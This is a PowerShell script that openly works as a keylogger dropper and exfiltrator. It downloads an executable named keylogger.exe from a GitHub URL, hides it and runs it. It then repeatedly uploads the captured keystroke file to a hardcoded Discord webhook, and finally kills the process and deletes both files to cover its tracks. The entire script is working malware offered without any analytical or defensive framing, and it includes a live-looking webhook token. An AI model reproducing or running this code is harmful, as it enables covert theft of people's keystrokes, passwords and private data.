# Define the path to the temporary folder
$tempFolderPath = [System.IO.Path]::Combine($env:USERPROFILE, 'AppData\Local\Temp\Keylogger')

# Create the temporary folder if it doesn't exist
if (-not (Test-Path -Path $tempFolderPath)) {
    New-Item -Path $tempFolderPath -ItemType Directory
}

# Define the paths for the executable and text file within the temporary folder
$exeFilePath = [System.IO.Path]::Combine($tempFolderPath, 'keylogger.exe')
$textFilePath = [System.IO.Path]::Combine($tempFolderPath, 'recorded_sequence.txt')

# Download the executable from the GitHub URL to the temporary folder
Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe' -OutFile $exeFilePath

# Check if the download was successful
if (Test-Path -Path $exeFilePath) {
    # Set the "Hidden" attribute to "True" to hide the file
    Set-ItemProperty -Path $exeFilePath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

    # Execute the downloaded executable
    Start-Process -FilePath $exeFilePath -NoNewWindow
} else {
    Write-Host 'Download failed. Please check the GitHub URL and try again.'
}

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"

# Function to send a file to Discord using a webhook and log the response
function Send-FileToDiscord {
    param (
        [string]$WebhookUrl,
        [string]$FilePath
    )

    # Define the boundary for multipart/form-data
    $boundary = [System.Guid]::NewGuid().ToString()

    # Read the binary content of the file
    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)

    # Create a web request
    $request = [System.Net.WebRequest]::Create($WebhookUrl)
    $request.Method = "POST"
    $request.ContentType = "multipart/form-data; boundary=$boundary"
    $request.ContentLength = $fileBytes.Length

    # Get the request stream and write the file content
    $requestStream = $request.GetRequestStream()
    $requestStream.Write($fileBytes, 0, $fileBytes.Length)
    $requestStream.Close()

    # Get the response
    $response = $request.GetResponse()
    $responseStream = $response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($responseStream)
    $responseText = $reader.ReadToEnd()
    $reader.Close()
    $responseStream.Close()
    $response.Close()

    # Log the response from Discord
    Write-Host "Discord Webhook Response: $responseText"
}

# Send the file to Discord a maximum of 10 times
$maxSendCount = 10     # Maximum number of times to send the file
$sendCount = 0          # Initialize the send count

while ($sendCount -lt $maxSendCount) {
    # Upload the text file to Discord
    Send-FileToDiscord -WebhookUrl $webhookUrl -FilePath $textFilePath

    # Increase the send count
    $sendCount++

    # Sleep for 30 seconds
    Start-Sleep -Seconds 30
}

# After sending files to Discord 10 times, delete the text file if it still exists
if (Test-Path -Path $textFilePath) {
    # Close the 'keylogger.exe' process if it's running
    Get-Process -Name 'keylogger' | ForEach-Object { Stop-Process -Id $_.Id -Force }

    Remove-Item -Path $textFilePath -Force -ErrorAction SilentlyContinue
    Write-Host "Deleted $textFilePath"
} else {
    Write-Host "Text file not found at $textFilePath"
}

# Delete the 'keylogger.exe' file from the temporary folder
if (Test-Path -Path $exeFilePath) {
    Remove-Item -Path $exeFilePath -Force -ErrorAction SilentlyContinue
    Write-Host "Deleted $exeFilePath"
} else {
    Write-Host "Exe file not found at $exeFilePath"
}
